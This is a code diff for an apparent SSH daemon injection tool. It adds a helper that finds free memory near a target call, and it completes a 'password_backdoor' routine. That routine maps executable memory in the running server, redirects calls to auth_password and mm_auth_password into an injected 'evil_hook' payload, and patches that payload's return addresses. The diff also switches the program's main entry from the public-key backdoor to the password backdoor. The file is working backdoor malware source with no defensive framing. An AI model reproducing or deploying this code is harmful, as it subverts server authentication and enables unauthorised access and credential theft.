@@ -48,6 +48,28 @@ u64 resolve_symbol_tab(inject_ctx *ctx, char *name) {
 	return sym;
 }
 
+// find a neighborly memoryhole where we can mmap
+u64 find_hole(inject_ctx *ctx, u64 call, u32 size) {
+	mem_mapping *m1, *m2;
+	u64 hole_addr = 0;
+	int i;
+	
+	for(i = 0; i < ctx->num_maps; i++) {
+		m1 = ctx->mappings[i];
+		m2 = ctx->mappings[i+1];
+
+		if(
+			call >= m1->start &&
+			m2->start > (m1->end + size)
+		) {
+			hole_addr = m1->end;
+
+			break;
+		}
+	}
+	
+	return hole_addr;
+}
 
 void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
@@ -66,7 +88,6 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	callcache_entry *callcache, *entry;
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
 	u64 diff=0, hole_addr=0;
-	mem_mapping *m1, *m2;
 
 	evil_bin = malloc(evil_hook_size);
 	memcpy(evil_bin, evil_hook, evil_hook_size);
@@ -113,20 +134,7 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	if (num_key_allowed2_calls == 0)
 		error("no call to user_key_allowed2 found :(");
 
-	// find a neighborly memoryhole where we can mmap
-	for(i=0; i < ctx->num_maps; i++) {
-		m1 = ctx->mappings[i];
-		m2 = ctx->mappings[i+1];
-
-		if(
-			user_key_allowed2_calls[0] >= m1->start &&
-			m2->start > (m1->end + 0x1000)
-		) {
-			hole_addr = m1->end;
-
-			break;
-		}
-	}
+	hole_addr = find_hole(ctx, user_key_allowed2_calls[0], 1000);
 	
 	if (hole_addr == 0) {
 		error("unable to find neighborly hole.");
@@ -167,7 +175,13 @@ void password_backdoor(inject_ctx *ctx) {
 	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
 	u64 auth_password=0, mm_auth_password=0;
 	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
-	int i, n_auth_password_calls, n_mm_auth_password_calls;
+	int i, j, n_auth_password_calls, n_mm_auth_password_calls;
+	u64 diff=0, hole_addr=0;
+	u8 *evil_bin;
+	u32 use_privsep_val=0;
+	
+	evil_bin = malloc(evil_hook_size);
+	memcpy(evil_bin, evil_hook, evil_hook_size);
 
 	use_privsep = resolve_symbol_tab(ctx, "use_privsep");
 
@@ -235,13 +249,71 @@ void password_backdoor(inject_ctx *ctx) {
 	if (n_mm_auth_password_calls == 0)
 		error("No calls to mm_auth_password found.");
 	
-	for (i = 0; i < n_auth_password_calls; i++) {
-		info("call to auth_password @ 0x%llx", auth_password_calls[i]);
+	hole_addr = find_hole(ctx, auth_password_calls[0], 1000);
+	
+	if (hole_addr == 0) {
+		error("unable to find neighborly hole.");
+	}
+
+	info("found usable hole @ 0x%lx", hole_addr);
+
+	info2("entering critical phase");
+	
+	_mmap(
+		ctx, (void*)hole_addr, 0x1000,
+		PROT_READ| PROT_WRITE | PROT_EXEC,
+		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
+		0, 0
+	);
+
+	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);
+	
+	if (use_privsep_val) {
+		// Patch mm_auth_password
+		for (i = 0; i < n_mm_auth_password_calls; i++) {
+			diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;
+
+			info(
+				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
+				mm_auth_password_calls[i], hole_addr,
+				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
+			);
+
+			_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
+		}
+	} else {
+		// Patch auth_password
+		for (i = 0; i < n_auth_password_calls; i++) {
+			diff = 0x100000000-(auth_password_calls[i]-hole_addr)-5;
+
+			info(
+				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
+				auth_password_calls[i], hole_addr,
+				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
+			);
+
+			_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
+		}
 	}
 	
-	for (i = 0; i < n_mm_auth_password_calls; i++) {
-		info("call to mm_auth_password @ 0x%llx", mm_auth_password_calls[i]);
+	// Insert return address
+	for(j = 0; j < evil_hook_size - 8; j++) {
+		u64 *vptr = (u64*)&evil_bin[j];
+		switch (*vptr) {
+			case 0x1111111122222222:
+				*vptr = use_privsep;
+				break;
+			case 0x3333333344444444:
+				*vptr = auth_password;
+				break;
+			case 0x5555555566666666:
+				*vptr = mm_auth_password;
+				break;
+		}
 	}
+
+	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
+	info("poked evil_bin to 0x%lx.", hole_addr);
 	
 	free(mm_auth_password_calls);
 	free(auth_password_calls);
@@ -318,8 +390,8 @@ int main(int argc, char *argv[]) {
 
 	cache_calltable(ctx);
 
-	//password_backdoor(ctx);
-	pubkey_backdoor(ctx, argv[2]);
+	password_backdoor(ctx);
+	//pubkey_backdoor(ctx, argv[2]);
 
 	info("switching off rexec..");
 	_poke(ctx->pid, rexec_flag, &nullw, 4);
